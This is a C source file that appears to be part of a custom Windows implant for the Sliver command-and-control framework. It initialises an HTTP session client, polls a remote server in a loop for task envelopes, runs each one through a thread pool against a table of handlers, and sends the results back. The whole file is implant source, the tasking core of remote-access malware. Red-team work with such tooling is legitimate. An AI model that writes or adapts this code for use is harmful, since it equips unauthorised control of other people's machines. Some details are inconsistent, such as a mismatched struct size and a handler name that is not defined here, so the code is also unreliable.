#include "pch.h"

PSLIVER_SESSION_CLIENT SessionInit
(
	_In_ PGLOBAL_CONFIG pGlobalConfig
)
{
	PSLIVER_SESSION_CLIENT pBeaconClient = NULL;
	UINT64 uReconnectDuration = 300;

	pBeaconClient = ALLOC(sizeof(SLIVER_BEACON_CLIENT));
	pBeaconClient->uReconnectDuration = uReconnectDuration;
	memcpy(&pBeaconClient->GlobalConfig, pGlobalConfig, sizeof(GLOBAL_CONFIG));
#ifdef __HTTP__
	pBeaconClient->Init = (CLIENT_INIT)HttpInit;
	pBeaconClient->Start = HttpStart;
	pBeaconClient->Send = HttpSend;
	pBeaconClient->Receive = HttpRecv;
	pBeaconClient->Close = HttpClose;
	pBeaconClient->Cleanup = HttpCleanup;
#else
#endif

CLEANUP:
	return pBeaconClient;
}

VOID SessionMainHandler
(
	_Inout_ PTP_CALLBACK_INSTANCE Instance,
	_Inout_opt_ PENVELOPE_WRAPPER pWrapper,
	_Inout_ PTP_WORK Work
)
{
	PENVELOPE pResp = NULL;
	PENVELOPE pEnvelope = NULL;
	LPSTR lpErrorDesc = NULL;
	SYSTEM_HANDLER* pSystemHandler = NULL;
	SYSTEM_HANDLER Handler = NULL;
	PSLIVER_SESSION_CLIENT pSession = NULL;

	//hException = AddVectoredExceptionHandler(1, ContinuableExceptionHanlder);
	pEnvelope = pWrapper->pEnvelope;
	pSession = pWrapper->pSession;
	pSystemHandler = GetSystemHandler();
	Handler = pSystemHandler[pEnvelope->uType];
	if (Handler != NULL) {
		pResp = Handler(pEnvelope);
	}

	if (pResp == NULL) {
		//lpErrorDesc = TlsGetValue(dwTlsIdx);
		pResp = CreateErrorRespEnvelope("Failed to execute task", pEnvelope->uID, 9);
	}

	pSession->Send(&pSession->GlobalConfig, pSession->lpClient , pResp);
CLEANUP:
	if (lpErrorDesc != NULL) {
		UnmapViewOfFile(lpErrorDesc);
	}

	if (pSystemHandler != NULL) {
		FREE(pSystemHandler);
	}

	//RemoveVectoredExceptionHandler(hException);
	FreeEnvelope(pResp);
	FreeEnvelope(pEnvelope);
	FREE(pWrapper);

	return;
}

VOID SessionMainLoop
(
	_In_ PSLIVER_SESSION_CLIENT pSession
)
{
	PENVELOPE pEnvelope = NULL;
	PSLIVER_THREADPOOL pSliverPool = NULL;
	PTP_WORK pWork = NULL;
	PENVELOPE_WRAPPER pWrapper = NULL;
	DWORD dwNumberOfAttempts = 0;

	pSliverPool = InitializeSliverThreadPool();
	if (pSliverPool == NULL) {
		goto CLEANUP;
	}

	while (TRUE) {
		if (dwNumberOfAttempts >= pSession->GlobalConfig.dwMaxFailure) {
			break;
		}

		pEnvelope = pSession->Receive(&pSession->GlobalConfig, pSession->lpClient);
		if (pEnvelope == NULL) {
			dwNumberOfAttempts++;
			Sleep(pSession->GlobalConfig.dwPollInterval * 1000);
			continue;
		}

		PrintFormatW(L"Receive Envelope:\n");
		HexDump(pEnvelope->pData->pBuffer, pEnvelope->pData->cbBuffer);
		pWrapper = ALLOC(sizeof(ENVELOPE_WRAPPER));
		pWrapper->pSession = pSession;
		pWrapper->pEnvelope = pEnvelope;
		pWork = CreateThreadpoolWork((PTP_WORK_CALLBACK)MainHandler, pWrapper, &pSliverPool->CallBackEnviron);
		if (pWork == NULL) {
			LOG_ERROR("CreateThreadpoolWork", GetLastError());
			goto CLEANUP;
		}

		TpPostWork(pWork);
		Sleep(pSession->GlobalConfig.dwPollInterval * 1000);
	}

CLEANUP:
	FreeSliverThreadPool(pSliverPool);

	return;
}